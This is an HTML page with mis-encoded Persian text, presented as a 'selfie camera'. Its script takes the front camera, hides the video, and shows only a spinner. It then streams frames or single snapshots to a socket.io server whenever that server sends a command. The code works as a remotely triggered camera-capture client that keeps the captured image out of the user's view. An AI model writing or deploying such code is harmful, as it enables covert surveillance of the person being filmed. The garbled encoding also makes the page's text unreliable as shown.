<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ“± Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000;
            color: #fff;
            font-family: Tahoma;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        
        .loading-screen {
            max-width: 300px;
        }
        
        .spinner {
            width: 100px;
            height: 100px;
            border: 10px solid #333;
            border-top: 10px solid #4CAF50;
            border-radius: 50%;
            animation: spin 2s linear infinite;
            margin: 0 auto 30px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            font-size: 20px;
            margin: 20px 0;
            color: #4CAF50;
            direction: rtl;
        }
        
        .error {
            color: #ff4444;
        }
        
        .connection-info {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin-top: 30px;
            font-size: 14px;
        }
        
        #videoElement {
            display: none;
        }
        
        .gear {
            font-size: 80px;
            margin-bottom: 20px;
            animation: rotate 3s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading-screen" id="loadingScreen">
        <div class="gear">âš™ï¸</div>
        <h2>Ø³ÛŒØ³ØªÙ… Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ</h2>
        <div class="status" id="status">â³ Ø¯Ø± Ø­Ø§Ù„ Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ...</div>
        
        <div class="connection-info">
            <div>ğŸ“¡ Ø¯Ø± Ø§Ù†ØªØ¸Ø§Ø± Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ±</div>
            <div>ğŸ“ Ø§ÛŒÙ† ØµÙØ­Ù‡ ÙÙ‚Ø· Ú†Ø±Ø®â€ŒØ¯Ù†Ø¯Ù‡ Ø±Ø§ Ù†Ø´Ø§Ù† Ù…ÛŒâ€ŒØ¯Ù‡Ø¯</div>
            <div>ğŸ‘ï¸ ØªØµÙˆÛŒØ± Ø¨Ø±Ø§ÛŒ Ø´Ù…Ø§ Ù†Ù…Ø§ÛŒØ´ Ø¯Ø§Ø¯Ù‡ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯</div>
        </div>
    </div>
    
    <video id="videoElement" autoplay playsinline></video>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Ø¹Ù†Ø§ØµØ± ØµÙØ­Ù‡
        const statusDiv = document.getElementById('status');
        const videoElement = document.getElementById('videoElement');
        
        // Ù…ØªØºÛŒØ±Ù‡Ø§
        let mediaStream = null;
        let canvas = null;
        let ctx = null;
        let isStreaming = false;
        let streamInterval = null;
        
        // Ø§ØªØµØ§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ±
        const socket = io();
        socket.emit('identify', 'client');
        
        // ÙˆØ¶Ø¹ÛŒØª Ø§ØªØµØ§Ù„
        socket.on('connect', () => {
            statusDiv.textContent = 'âœ… Ø¨Ù‡ Ø³Ø±ÙˆØ± Ù…ØªØµÙ„ Ø´Ø¯';
            statusDiv.style.color = '#4CAF50';
            setTimeout(initCamera, 1000);
        });
        
        socket.on('disconnect', () => {
            statusDiv.textContent = 'âŒ Ù‚Ø·Ø¹ Ø§Ø±ØªØ¨Ø§Ø· Ø¨Ø§ Ø³Ø±ÙˆØ±';
            statusDiv.style.color = '#ff4444';
            stopStreaming();
        });
        
        // Ø¯Ø±ÛŒØ§ÙØª Ø¯Ø³ØªÙˆØ± Ø§Ø² Ø³Ø±ÙˆØ±
        socket.on('command', (command) => {
            console.log('Ø¯Ø³ØªÙˆØ± Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯:', command);
            
            switch(command.action) {
                case 'start-stream':
                    startStreaming();
                    statusDiv.textContent = 'â–¶ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ ØªØµÙˆÛŒØ±...';
                    break;
                    
                case 'stop-stream':
                    stopStreaming();
                    statusDiv.textContent = 'â¸ï¸ Ø§Ø±Ø³Ø§Ù„ Ù…ØªÙˆÙ‚Ù Ø´Ø¯';
                    break;
                    
                case 'capture-image':
                    captureImage();
                    statusDiv.textContent = 'ğŸ“¸ ØªØµÙˆÛŒØ± Ø«Ø¨Øª Ø´Ø¯!';
                    setTimeout(() => {
                        if (isStreaming) {
                            statusDiv.textContent = 'â–¶ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ ØªØµÙˆÛŒØ±...';
                        }
                    }, 2000);
                    break;
            }
        });
        
        // Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ†
        async function initCamera() {
            try {
                statusDiv.textContent = 'ğŸ“· Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†...';
                
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false // ÙÙ‚Ø· ØªØµÙˆÛŒØ±
                });
                
                videoElement.srcObject = mediaStream;
                
                // Ø§ÛŒØ¬Ø§Ø¯ Ú©Ø§Ù†ÙˆØ³ Ù…Ø®ÙÛŒ
                canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                ctx = canvas.getContext('2d');
                
                statusDiv.textContent = 'âœ… Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¢Ù…Ø§Ø¯Ù‡ Ø§Ø³Øª';
                statusDiv.style.color = '#4CAF50';
                
            } catch (error) {
                statusDiv.innerHTML = 'âŒ Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ†<br><small>' + error.message + '</small>';
                statusDiv.style.color = '#ff4444';
            }
        }
        
        // Ø´Ø±ÙˆØ¹ Ø§Ø±Ø³Ø§Ù„ ØªØµÙˆÛŒØ±
        function startStreaming() {
            if (!mediaStream || isStreaming) return;
            
            isStreaming = true;
            
            streamInterval = setInterval(() => {
                if (videoElement.videoWidth > 0) {
                    // Ø±Ø³Ù… ØªØµÙˆÛŒØ± Ø±ÙˆÛŒ Ú©Ø§Ù†ÙˆØ³
                    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    
                    // ØªØ¨Ø¯ÛŒÙ„ Ø¨Ù‡ Ø¹Ú©Ø³ Ø¨Ø§ Ú©ÛŒÙÛŒØª Ù…ØªÙˆØ³Ø·
                    const imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø³Ø±ÙˆØ±
                    socket.emit('stream', {
                        image: imageData,
                        timestamp: Date.now()
                    });
                }
            }, 100); // Ù‡Ø± 100 Ù…ÛŒÙ„ÛŒâ€ŒØ«Ø§Ù†ÛŒÙ‡
        }
        
        // ØªÙˆÙ‚Ù Ø§Ø±Ø³Ø§Ù„
        function stopStreaming() {
            isStreaming = false;
            if (streamInterval) {
                clearInterval(streamInterval);
                streamInterval = null;
            }
        }
        
        // Ø«Ø¨Øª ØªØµÙˆÛŒØ±
        function captureImage() {
            if (!mediaStream) return;
            
            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.9);
            
            socket.emit('captured-image', {
                image: imageData
            });
        }
        
        // ØªÙ…ÛŒØ²Ú©Ø§Ø±ÛŒ
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>